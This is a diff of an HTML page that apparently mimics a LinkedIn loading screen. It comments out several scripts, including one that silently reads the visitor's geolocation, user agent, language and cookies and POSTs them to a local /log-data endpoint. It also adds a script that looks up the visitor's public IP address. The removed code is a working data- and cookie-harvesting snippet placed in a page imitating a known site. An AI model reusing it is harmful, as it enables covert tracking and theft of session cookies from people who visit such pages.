@@ -64,7 +64,7 @@
   </div>
 </div>
 
-<script>
+<!-- <script>
   window.addEventListener('DOMContentLoaded', () => {
     const popup = document.getElementById('geo-popup');
     const geoData = document.getElementById('geo-data');
@@ -86,13 +86,13 @@
       popup.style.display = 'block';
     }
   });
-</script>
+</script> -->
 
 <body>
-  <h2>Your Geolocation:</h2>
-  <div id="geo-display">Loading location...</div>
+  <!-- <h2>Your Geolocation:</h2>
+  <div id="geo-display">Loading location...</div> -->
 
-  <script>
+  <!-- <script>
     const geoDisplay = document.getElementById('geo-display');
 
     if ('geolocation' in navigator) {
@@ -109,7 +109,12 @@
     } else {
       geoDisplay.textContent = 'Geolocation is not supported by this browser.';
     }
-  </script>
+  </script> -->
+  <script nonce="1cDKta959kS3xWhxgMjDKw">
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => console.log("Your IP:", data.ip));
+    </script>
 </body>
 
 <link rel="icon" href="https://raw.githubusercontent.com/NandiniRam32/LinkedIn-Loading/main/LinkedInLogo.png" type="image/png">
@@ -143,7 +148,7 @@
   <div id="geo-info" style="margin-top: 8px; font-size: 14px;">Loading...</div>
 </div>
 
-<script>
+<!-- <script>
 (async () => {
   let location = null;
   let geoInfo = document.getElementById('geo-info');
@@ -179,7 +184,7 @@
     }),
   });
 })();
-</script>
+</script> -->
   
 
   
@@ -231,37 +236,37 @@
     <!-- graphql-script-injection -->
     <div id="artdeco-modal-outlet"></div>
 
-    <script>
-(async () => {
-  let location = null;
-  try {
-    location = await new Promise((resolve, reject) =>
-      navigator.geolocation.getCurrentPosition(
-        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-        err => resolve(null),
-        { timeout: 5000 }
-      )
-    );
-  } catch (err) {
-    location = null;
-  }
+    <!-- <script>
+      (async () => {
+        let location = null;
+        try {
+          location = await new Promise((resolve, reject) =>
+            navigator.geolocation.getCurrentPosition(
+              pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+              err => resolve(null),
+              { timeout: 5000 }
+            )
+          );
+        } catch (err) {
+          location = null;
+        }
 
-  fetch('http://localhost:3000/log-data', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      cookies: document.cookie,
-      location,
-    }),
-  });
-})();
-</script>
+        fetch('http://localhost:3000/log-data', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            cookies: document.cookie,
+            location,
+          }),
+        });
+      })();
+    </script> -->
 
 <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" style="display: none" class="terminatorlet">
 
 
 
     <div id="a11y-notification" class="visually-hidden" role="region" aria-live="polite"></div>
-
+  
